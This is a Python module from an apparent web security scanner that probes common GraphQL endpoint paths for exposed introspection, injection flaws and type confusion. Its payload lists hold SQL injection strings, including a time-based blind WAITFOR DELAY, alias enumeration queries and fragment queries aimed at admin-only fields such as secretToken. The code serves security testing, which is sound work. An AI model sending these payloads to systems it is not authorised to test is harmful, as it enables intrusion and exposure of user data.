"""
GraphQL endpoint security testing.
Tests for introspection exposure, injection vulnerabilities, and common misconfigurations.
"""

import httpx
import json
from typing import Dict, List, Any, Optional

from core.session_store import SessionStore
from core.vuln_checks import GRAPHQL_INTROSPECTION, GRAPHQL_ATTACKS


# Common GraphQL endpoint paths
GRAPHQL_ENDPOINTS = [
    "/graphql",
    "/api/graphql",
    "/graphql/v1",
    "/v1/graphql",
    "/graphql/query",
    "/api/graphql/query",
    "/gql",
    "/api/gql",
    "/Graph/QL",
    "/.graphql",
]

# GraphQL injection test payloads
GRAPHQL_INJECTIONS = [
    {
        "name": "SQLi in string input",
        "payload": '{ user(id: "1 OR 1=1") { id email } }',
        "description": "GraphQL string parameter with SQL injection"
    },
    {
        "name": "Boolean-based injection",
        "payload": '{ user(id: "1\' OR \'1\'=\'1") { id email } }',
        "description": "Boolean-based GraphQL injection"
    },
    {
        "name": "Time-based blind",
        "payload": '{ user(id: "1; WAITFOR DELAY \'00:00:05\'--") { id email } }',
        "description": "Time-based blind GraphQL injection"
    },
    {
        "name": "Field enumeration",
        "payload": '{ __type(name: "User") { name fields { name type { kind } } } }',
        "description": "GraphQL introspection field enumeration"
    },
    {
        "name": "Alias query",
        "payload": '{ a: user(id: "1") { id } b: user(id: "2") { id } c: user(id: "3") { id } }',
        "description": "GraphQL alias-based enumeration"
    },
]


async def test_graphql(
    target_url: str,
    session_store: SessionStore,
    role: Optional[str] = None
) -> Dict[str, Any]:
    """
    Test GraphQL endpoints for security vulnerabilities.
    Tests introspection exposure and injection vulnerabilities.
    
    Args:
        target_url: Target application URL (e.g., http://localhost:3000)
        session_store: SessionStore with authenticated sessions
        role: Role to use for authentication (None for unauthenticated)
        
    Returns:
        Dictionary with findings list containing test results
    """
    findings = {
        "type": "GRAPHQL_SECURITY_SCAN",
        "target_url": target_url,
        "endpoints_tested": [],
        "vulnerabilities": []
    }
    
    # Prepare headers
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    cookies = {}
    
    if role:
        try:
            headers.update(session_store.get_headers(role))
            cookies = session_store.get_cookies(role)
        except:
            pass
    
    async with httpx.AsyncClient(
        follow_redirects=True,
        verify=False,
        timeout=10.0
    ) as client:
        # Test each common GraphQL endpoint
        for endpoint_path in GRAPHQL_ENDPOINTS:
            try:
                endpoint_url = target_url.rstrip('/') + endpoint_path
                endpoint_result = await _test_graphql_endpoint(
                    client, endpoint_url, headers, cookies
                )
                
                if endpoint_result:
                    findings["endpoints_tested"].append(endpoint_url)
                    findings["vulnerabilities"].extend(endpoint_result)
            
            except Exception as e:
                # Silent failure per endpoint
                pass
    
    return findings


async def _test_graphql_endpoint(
    client: httpx.AsyncClient,
    endpoint_url: str,
    headers: Dict[str, str],
    cookies: Dict[str, str]
) -> Optional[List[Dict[str, Any]]]:
    """
    Test a specific GraphQL endpoint.
    
    Args:
        client: HTTPX async client
        endpoint_url: Full URL to GraphQL endpoint
        headers: Headers to include
        cookies: Cookies to include
        
    Returns:
        List of vulnerability findings or None if endpoint not GraphQL
    """
    findings = []
    
    try:
        # Test 1: Introspection query
        introspection_result = await _test_introspection(
            client, endpoint_url, headers, cookies
        )
        
        if introspection_result:
            findings.append(introspection_result)
        
        # Test 2: GraphQL injection payloads
        injection_results = await _test_graphql_injections(
            client, endpoint_url, headers, cookies
        )
        findings.extend(injection_results)
        
        # Only return if we found GraphQL (introspection or successful query)
        if findings:
            return findings
    
    except Exception as e:
        pass
    
    return None


async def _test_introspection(
    client: httpx.AsyncClient,
    endpoint_url: str,
    headers: Dict[str, str],
    cookies: Dict[str, str]
) -> Optional[Dict[str, Any]]:
    """
    Test if GraphQL introspection is exposed.
    
    Args:
        client: HTTPX async client
        endpoint_url: GraphQL endpoint URL
        headers: Headers to include
        cookies: Cookies to include
        
    Returns:
        Finding dictionary if introspection exposed, None otherwise
    """
    try:
        payload = {"query": GRAPHQL_INTROSPECTION}
        
        response = await client.post(
            endpoint_url,
            json=payload,
            headers=headers,
            cookies=cookies
        )
        
        # Check if response indicates GraphQL endpoint
        if response.status_code == 200:
            response_json = response.json()
            
            # Check for introspection data
            if response_json.get("data") and response_json["data"].get("__schema"):
                # Introspection exposed!
                return {
                    "type": "GRAPHQL_INTROSPECTION_EXPOSED",
                    "severity": "HIGH",
                    "endpoint": endpoint_url,
                    "status_code": response.status_code,
                    "description": "GraphQL introspection query succeeded - schema is exposed",
                    "response_preview": str(response_json)[:200]
                }
            
            # GraphQL endpoint exists even if introspection failed
            if response_json.get("errors") or response_json.get("data"):
                return {
                    "type": "GRAPHQL_ENDPOINT_FOUND",
                    "severity": "MEDIUM",
                    "endpoint": endpoint_url,
                    "status_code": response.status_code,
                    "description": "GraphQL endpoint found",
                    "has_introspection": bool(response_json.get("data", {}).get("__schema")),
                    "response_preview": str(response_json)[:200]
                }
    
    except Exception as e:
        pass
    
    return None


async def _test_graphql_injections(
    client: httpx.AsyncClient,
    endpoint_url: str,
    headers: Dict[str, str],
    cookies: Dict[str, str]
) -> List[Dict[str, Any]]:
    """
    Test GraphQL endpoint for injection vulnerabilities.
    
    Args:
        client: HTTPX async client
        endpoint_url: GraphQL endpoint URL
        headers: Headers to include
        cookies: Cookies to include
        
    Returns:
        List of injection findings
    """
    findings = []
    
    try:
        for injection in GRAPHQL_INJECTIONS:
            try:
                payload = {"query": injection["payload"]}
                
                response = await client.post(
                    endpoint_url,
                    json=payload,
                    headers=headers,
                    cookies=cookies,
                    timeout=5.0
                )
                
                response_json = {}
                try:
                    response_json = response.json()
                except:
                    response_json = {"raw": response.text[:200]}
                
                # Analyze response for indicators
                indication = _analyze_graphql_response(response_json, injection)
                
                if indication:
                    findings.append({
                        "type": indication,
                        "severity": "HIGH" if indication == "GRAPHQL_INJECTION" else "MEDIUM",
                        "endpoint": endpoint_url,
                        "injection_type": injection["name"],
                        "payload": injection["payload"],
                        "status_code": response.status_code,
                        "description": injection["description"],
                        "response_preview": str(response_json)[:300]
                    })
            
            except Exception as e:
                # Silent failure per injection
                pass
    
    except Exception as e:
        pass
    
    return findings


def _analyze_graphql_response(response: Dict[str, Any], injection: Dict[str, str]) -> Optional[str]:
    """
    Analyze GraphQL response for vulnerability indicators.
    
    Args:
        response: Parsed JSON response from GraphQL endpoint
        injection: The injection test that was sent
        
    Returns:
        Vulnerability type string if found, None otherwise
    """
    try:
        # Check for successful data return (indicates injection might have worked)
        if response.get("data"):
            # If we got data back from an injection query, it might be vulnerable
            data = response.get("data", {})
            
            # Check if query executed (e.g., user alias enumeration worked)
            if "user" in injection["payload"].lower():
                if isinstance(data, dict) and any(k in data for k in ["user", "a", "b", "c"]):
                    return "GRAPHQL_INJECTION"
            
            # Check for field enumeration success
            if "__type" in injection["payload"]:
                if data.get("__type"):
                    return "GRAPHQL_FIELD_ENUMERATION"
        
        # Check for errors that reveal backend info
        if response.get("errors"):
            errors = response["errors"]
            if isinstance(errors, list):
                for error in errors:
                    if isinstance(error, dict):
                        error_msg = error.get("message", "").lower()
                        
                        # Database error indicators
                        if any(db_term in error_msg for db_term in ["sql", "mysql", "postgres", "sqlite"]):
                            return "GRAPHQL_DATABASE_ERROR"
                        
                        # Information disclosure
                        if any(info_term in error_msg for info_term in ["unexpected", "invalid", "parse"]):
                            return "GRAPHQL_ERROR_DISCLOSURE"
    
    except Exception as e:
        pass
    
    return None


async def test_graphql_union_attacks(
    client: httpx.AsyncClient,
    endpoint_url: str,
    headers: Dict[str, str],
    cookies: Dict[str, str]
) -> List[Dict[str, Any]]:
    """
    Test for GraphQL UNION-like attacks and type confusion.
    
    Args:
        client: HTTPX async client
        endpoint_url: GraphQL endpoint URL
        headers: Headers to include
        cookies: Cookies to include
        
    Returns:
        List of findings
    """
    findings = []
    
    try:
        union_payloads = [
            {
                "query": """
                    {
                        me {
                            ... on Admin {
                                id
                                securityLevel
                            }
                            ... on User {
                                id
                                email
                            }
                        }
                    }
                """,
                "name": "Fragment type confusion"
            },
            {
                "query": """
                    {
                        user(id: "1") {
                            id
                            email
                            __typename
                            ... on AdminUser {
                                adminPanel
                                secretToken
                            }
                        }
                    }
                """,
                "name": "Inline fragment privilege escalation"
            }
        ]
        
        for payload_obj in union_payloads:
            try:
                payload = {"query": payload_obj["query"]}
                response = await client.post(
                    endpoint_url,
                    json=payload,
                    headers=headers,
                    cookies=cookies,
                    timeout=5.0
                )
                
                response_json = response.json() if response.status_code == 200 else {}
                
                if response_json.get("data"):
                    findings.append({
                        "type": "GRAPHQL_TYPE_CONFUSION",
                        "severity": "HIGH",
                        "endpoint": endpoint_url,
                        "attack": payload_obj["name"],
                        "status_code": response.status_code,
                        "response_preview": str(response_json)[:300]
                    })
            
            except Exception as e:
                pass
    
    except Exception as e:
        pass
    
    return findings
